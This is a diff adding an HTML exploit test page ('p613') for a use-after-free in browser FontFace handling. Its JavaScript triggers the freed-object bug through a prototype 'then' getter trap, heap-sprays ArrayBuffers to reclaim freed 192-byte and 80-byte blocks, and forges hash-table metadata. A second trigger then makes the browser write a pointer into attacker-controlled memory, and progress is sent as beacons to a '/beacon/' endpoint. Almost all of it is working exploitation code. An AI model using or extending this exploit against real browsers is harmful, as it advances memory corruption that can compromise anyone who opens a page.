@@ -1,0 +1,267 @@
+<!--
+  p613: 80B table-block reclaim verification
+
+  After the FontFace UAF, GC frees the wrapper which frees the 80B HashTable
+  block at T-0x10. We spray ArrayBuffer(80) to reclaim it, then trigger a
+  SECOND UAF whose continuation (addClient) reads the table from +0x58.
+
+  If +0x58 points to our reclaimed 80B block (at T), addClient writes into
+  our controlled buffer — detectable by scanning for modified bytes.
+
+  Key addresses (from p612, 18/18 deterministic):
+    T = 0x10001cbad0  (HashTable buckets start)
+    Table block = T-0x10 = 0x10001cbac0 (80B allocation)
+
+  Phase 1: UAF → spray 192B → read T → confirm → null +0x58 for safe GC
+  Phase 2: Force GC → spray 80B → write forged table metadata
+  Phase 3: Second UAF → spray 192B with +0x58 = T → addClient writes into 80B
+  Phase 4: Scan 80B buffers for modifications (addClient wrote a pointer)
+
+  CRASH_CLASS: HIGH (double UAF trigger)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p613</title>
+<style id="v1">@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+function wD(v,o,x){v[o]=x&0xFF;v[o+1]=(x>>>8)&0xFF;v[o+2]=(x>>>16)&0xFF;v[o+3]=(x>>>24)&0xFF;}
+function wQ(v,o,hi,lo){wD(v,o,lo);wD(v,o+4,hi);}
+
+// T is read dynamically from phase 1 hit — no hardcoded value
+var T_HI = 0, T_LO = 0;
+
+function main(){
+b('P613-START');
+
+// ===== PHASE 1: First UAF — get T, confirm it's deterministic =====
+var pa1 = new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(pa1);
+void pa1.loaded;
+
+var phase1done = 0;
+var hitBuf = null;
+var hitIdx = -1;
+var confirmedT = 0;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+get:function(){
+  if(phase1done) return;
+  phase1done = 1;
+  document.getElementById('v1').remove();
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+
+  var lane1 = [];
+  for(var i=0;i<2048;i++) lane1.push(new Uint8Array(new ArrayBuffer(192)));
+  for(var j=0;j<lane1.length;j++){
+    wD(lane1[j], 0x00, 2);  // rc seed
+    wQ(lane1[j], 0x58, 0, 0);  // null +0x58 for safe GC
+    wQ(lane1[j], 0x60, 0xFFFFFFFF, 0xFFFFFFFF);  // sentinel at +0x60
+    wQ(lane1[j], 0x68, 0, 0);  // null +0x68
+    lane1[j][0x82] = 3;  // status seed
+  }
+  window._l1 = lane1;
+  return;
+},set:function(){}});
+
+document.fonts.load('1em pa, sa','AB').then(function(){},function(){});
+
+setTimeout(function(){
+  var lane1 = window._l1;
+  if(!lane1){b('P613-PH1-NOLANE');return;}
+
+  // Find the hit buffer
+  for(var i=0;i<lane1.length;i++){
+    var v=lane1[i], rc=rD(v,0);
+    var s60 = rQ(v,0x60);
+    if(rc !== 2 || s60 !== 'ffffffffffffffff'){
+      var T = rQ(v,0x58);
+      var W = rQ(v,0x68);
+      hitBuf = v;
+      hitIdx = i;
+
+      // Verify T matches expected
+      T_HI = rD(v,0x5C);
+      T_LO = rD(v,0x58);
+      confirmedT = 1;
+      b('P613-PH1-HIT-b'+i+'-T='+T+'-W='+W+'-rc='+rc);
+
+      // Null +0x58 so GC destructor (removeClient) reads null table → safe skip
+      wQ(v, 0x58, 0, 0);
+      b('P613-PH1-NULLED-0x58-Thi='+T_HI.toString(16)+'-Tlo='+T_LO.toString(16));
+      break;
+    }
+  }
+
+  if(!hitBuf){b('P613-PH1-MISS');return;}
+  if(!confirmedT){b('P613-PH1-NO-HIT');return;}
+
+  // ===== PHASE 2: Force GC → spray 80B to reclaim table block =====
+  b('P613-PH2-GC-START');
+
+  // Release phase1 spray (except hit buffer) to reduce memory pressure
+  for(var i=0;i<lane1.length;i++){
+    if(i !== hitIdx) lane1[i] = null;
+  }
+  window._l1 = null;
+
+  // Force GC: allocate and discard to trigger collection
+  // The wrapper (FontFace W1) should be GC'd, freeing the 80B table block
+  for(var g=0;g<50;g++){
+    var garbage = [];
+    for(var k=0;k<500;k++) garbage.push(new ArrayBuffer(256));
+    garbage = null;
+  }
+
+  setTimeout(function(){
+    b('P613-PH2-80B-SPRAY');
+
+    // Spray 80B ArrayBuffers to reclaim the table block at T-0x10
+    // Table was 80B: 16B metadata prefix + 64B buckets (8 slots × 8B)
+    var lane80 = [];
+    for(var i=0;i<4096;i++){
+      var ab = new ArrayBuffer(80);
+      var u = new Uint8Array(ab);
+      // Write forged table metadata at the start of the 80B block
+      // If this reclaims T-0x10, then:
+      //   offset 0x00 = deletedCount → 0
+      //   offset 0x04 = keyCount → 0
+      //   offset 0x08 = tableSizeMask → 7 (8-slot table, mask = size-1)
+      //   offset 0x0C = tableSize → 8
+      //   offset 0x10..0x4F = buckets[0..7] → all 0 (empty)
+      wD(u, 0x00, 0);  // deletedCount = 0
+      wD(u, 0x04, 0);  // keyCount = 0
+      wD(u, 0x08, 7);  // tableSizeMask = 7
+      wD(u, 0x0C, 8);  // tableSize = 8
+      // Buckets all zero (empty sentinel for WTF::HashTable)
+      // Write a signature at bucket[7] (offset 0x48) to detect reclaim
+      wD(u, 0x48, 0xCAFE0613);
+      wD(u, 0x4C, 0x00000000);
+      lane80.push(u);
+    }
+    window._l80 = lane80;
+
+    b('P613-PH2-80B-SPRAYED-'+lane80.length);
+
+    // ===== PHASE 3: Second UAF =====
+    // Re-inject @font-face for sa
+    setTimeout(function(){
+      b('P613-PH3-SETUP');
+      var style2 = document.createElement('style');
+      style2.id = 'v2';
+      style2.textContent = '@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}';
+      document.head.appendChild(style2);
+
+      var pa2 = new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
+      document.fonts.add(pa2);
+      void pa2.loaded;
+
+      var phase3done = 0;
+      // Redefine .then trap for phase 3
+      Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+      get:function(){
+        if(phase3done) return;
+        phase3done = 1;
+        document.getElementById('v2').remove();
+        try{document.fonts.delete(this);}catch(e){}
+        document.body.offsetHeight;
+
+        // Spray 192B with +0x58 = T (pointing to our reclaimed 80B block)
+        var lane2 = [];
+        for(var i=0;i<2048;i++){
+          var ab = new ArrayBuffer(192);
+          var u = new Uint8Array(ab);
+          wD(u, 0x00, 2);  // rc seed
+          // Set +0x58 = T (so addClient reads table from our 80B block)
+          wD(u, 0x58, T_LO);
+          wD(u, 0x5C, T_HI);
+          wQ(u, 0x68, 0, 0);  // null W for now
+          u[0x82] = 3;
+          u[0x85] = 0xAA;  // sentinel for m_mayBePurged
+          lane2.push(u);
+        }
+        window._l2 = lane2;
+        return;
+      },set:function(){}});
+
+      document.fonts.load('1em pa, sa','AB').then(function(){},function(){});
+
+      // ===== PHASE 4: Check results =====
+      setTimeout(function(){
+        b('P613-PH4-CHECK');
+        var lane2 = window._l2;
+        var lane80 = window._l80;
+
+        if(!lane2){b('P613-PH4-NOLANE2');return;}
+
+        // Find phase 3 hit buffer
+        var hit2 = -1;
+        for(var i=0;i<lane2.length;i++){
+          var v=lane2[i], rc=rD(v,0);
+          if(rc !== 2){
+            var T2 = rQ(v,0x58);
+            var W2 = rQ(v,0x68);
+            var kc = rD(v,0x85);
+            hit2 = i;
+            b('P613-PH3-HIT-b'+i+'-T2='+T2+'-W2='+W2+'-rc='+rc+'-may='+v[0x85]);
+            break;
+          }
+        }
+
+        if(hit2 < 0){b('P613-PH3-MISS');return;}
+
+        // Scan 80B buffers for modifications by addClient
+        // addClient would:
+        //   1. Read tableSizeMask from T-8 (our offset 0x08)
+        //   2. Compute bucket = T + (hash & mask) * 8
+        //   3. Write FontFaceClientWrapper* into the bucket
+        //   4. Increment keyCount at T-0xC (our offset 0x04)
+        var modified = 0;
+        var sigSurvived = 0;
+        for(var i=0;i<lane80.length;i++){
+          var u = lane80[i];
+          var kc = rD(u, 0x04);  // keyCount
+          var sig = rD(u, 0x48); // our signature
+
+          // Check if keyCount changed (was 0, addClient increments to 1+)
+          if(kc !== 0){
+            modified++;
+            if(modified <= 5){
+              // Dump the whole 80B buffer
+              var hex = '';
+              for(var j=0;j<80;j++) hex += ('0'+u[j].toString(16)).slice(-2);
+              b('P613-80B-MOD-i'+i+'-kc='+kc+'-hex='+hex);
+            }
+          }
+
+          // Check if signature survived (no overwrite)
+          if(sig === 0xCAFE0613) sigSurvived++;
+        }
+
+        b('P613-RESULT-modified='+modified+'/'+lane80.length+'-sigSurvived='+sigSurvived);
+
+        // Also check if any 80B bucket got a pointer written (non-zero at offset 0x10..0x48)
+        var ptrWrites = 0;
+        for(var i=0;i<lane80.length;i++){
+          var u = lane80[i];
+          for(var off=0x10;off<0x48;off+=8){
+            var lo = rD(u,off), hi = rD(u,off+4);
+            if(lo !== 0 || hi !== 0){
+              if(ptrWrites < 5){
+                b('P613-80B-PTR-i'+i+'-off=0x'+off.toString(16)+'-val='+rQ(u,off));
+              }
+              ptrWrites++;
+            }
+          }
+        }
+        b('P613-80B-PTRWRITES='+ptrWrites);
+
+        b('P613-DONE');
+      }, 200);
+    }, 500);
+  }, 500);
+}, 150);
+}
+setTimeout(main, 300);
+</script></head><body>p613: 80B table block reclaim test</body></html>
